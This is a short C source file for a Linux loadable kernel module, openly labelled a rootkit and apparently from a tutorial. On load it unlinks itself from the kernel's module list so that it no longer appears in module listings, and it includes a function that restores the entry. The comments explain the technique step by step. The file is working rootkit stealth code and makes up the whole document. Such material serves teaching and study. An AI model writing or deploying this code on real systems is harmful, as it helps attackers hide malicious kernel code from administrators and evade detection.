#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Hiding LKMs");
MODULE_VERSION("0.01");

/* list_head is a doubly-linked list structure used by the kernel
 * It's got a .prev and .next field, but we can use the list_del()
 * and list_add() functions add/remove items from a list_head struct.
 * The only thing to keep in mind is that we need to keep a local copy
 * of the item that we remove so we can add it back later when we're done.
 */
static struct list_head *prev_module;
static short hidden = 0;

void showme(void)
{
	/* Add the saved list_head struct back to the module list */
	list_add(&THIS_MODULE->list, prev_module);
	hidden = 0;
}

void hideme(void)
{
	/* Save the module in the list before us, so we can add ourselves
	 * back to the list in the same place later. */
	prev_module = THIS_MODULE->list.prev;
	/* Remove ourselves from the list module list */
	list_del(&THIS_MODULE->list);
	hidden = 1;
}

static int __init rootkit_init(void)
{
	printk(KERN_INFO "Rootkit Loaded >:-)\n");
	hideme();
	return 0;
}

static void __exit rootkit_exit(void)
{
	/* Note that you won't be able to unload this LKM yet... */
	printk(KERN_INFO "Goodbye, World!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
